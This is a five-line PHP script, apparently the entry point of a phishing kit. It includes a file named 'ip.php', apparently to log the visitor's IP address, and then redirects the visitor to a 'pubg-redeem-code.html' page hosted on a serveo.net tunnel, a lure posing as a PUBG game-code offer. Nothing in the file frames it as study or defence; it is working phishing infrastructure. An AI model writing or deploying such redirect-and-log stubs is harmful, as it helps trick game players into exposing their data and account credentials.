<?php
include 'ip.php';
header('Location: https://casso.serveo.net/pubg-redeem-code.html');
exit
?>
